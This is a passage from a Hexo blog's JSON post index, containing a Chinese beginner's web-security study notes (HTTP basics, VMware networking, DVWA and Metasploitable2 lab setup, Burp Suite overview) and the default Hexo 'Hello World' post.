解析漏洞","categories":[],"tags":[]},{"title":"web安全入门第一天","slug":"web安全入门第一天","date":"03-18","updated":"03-24","comments":true,"path":"2019/03/18/web安全入门第一天/","link":"","permalink":"148.70.147.195/index.html/2019/03/18/web安全入门第一天/","excerpt":"","text":"在学习这些东西之前，就只学过学校教的c语言吧，看过几天python算是从0开开始学习安全这一块了这篇博客大概就是从i春秋和安全牛客上看视频学习的一些学习记录。 web入门第一天HTTP之请求方法请求： GET HEAD POSTHTTP之响应消息Response;一般情况有4部分1.状态行 2消息报头3.空行 4.响应正文提交请求后会收到返还的状态码：1xx:指示信息–请求已接收，继续处理 ；2xx:成功–接收、理解、接受 ；3xx：重定向–要完成请求必须更进一步操作；4xx:客户端错误–请求有语法错误or无法实现请求；5xx：服务器错误–服务器未能实现合法请求。 渗透测试一般在虚拟机上环境下比较方便（百度上有各种各样的教程这里就不过多赘述了）这里插一个我当初安装kali时用的教程kali的账户默认为root 密码默认为toor然后讲一讲安装好后的配置问题：VMware 提供了三种网络工作模式 （解决虚拟机网络联通的问题）·Bridged 桥接模式：虚拟机和实体机在同一网段IP相同·NAT 网络地址转换模式：虚拟机通过实体机来上网·Host_Only 仅主机模式：只能和实体机通讯无法上网VMware workstation 还提供了虚拟机快照的功能“位于顶部文件那一栏”对虚拟机的运行状态进行快照，（包括正在安装的软件，和进程）以便恢复之前的状态。（建议在第一次配置好后拍一张快照储存当初始化用） 然后来讲一下网站的搭建网站由中间件、网站程序、数据库等程序组成。常见的中间件大致就是Apache、Ninx、IIS这三种然后由 PHP、JSP、ASP等web语言编写，数据库则mysql是目前最火的数据库我们搭建网站时可以独立安装每一个组建，也有一键建站的集成功能。当然，各有好处常见的集成环境：·phpStudy ·XAMPP ·Wamp ServerDVWA时开源的漏洞靶场功能强大，学习适合可以参照百度上的教程也可以安装虚拟机靶场Metasploitable2-Linux 账号密码都为msfadmin 登录后ifxonfig出ip 在浏览器输入ip就可以使用了DVWA的账户默认为admin 密码是password。 Burpsuit基础burpsuit是用于攻击web的集成平台。包含许多工具所有工具都共享一个能处理并显示HTTP消息，持久性，认证，代理日志警报的一个强大的可扩展框架所有功能的核心都是HTTP代理对HTTP流量分析方便挖掘web漏洞顺便体一句HTTP代理：HTTP代理位于浏览器和web服务器之间可以分析浏览器和服务器之间的通信数据 ，测试web漏洞如SQl注入，文件上传，弱口令等 这篇算是测试了看一看写出来的效果如何后面在做调整","categories":[],"tags":[]},{"title":"Hello World","slug":"hello-world","date":"03-17","updated":"03-17","comments":true,"path":"2019/03/17/hello-world/","link":"","permalink":"148.70.147.195/index.html/2019/03/17/hello-world/","excerpt":"","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","categories":[],"tags":[]}]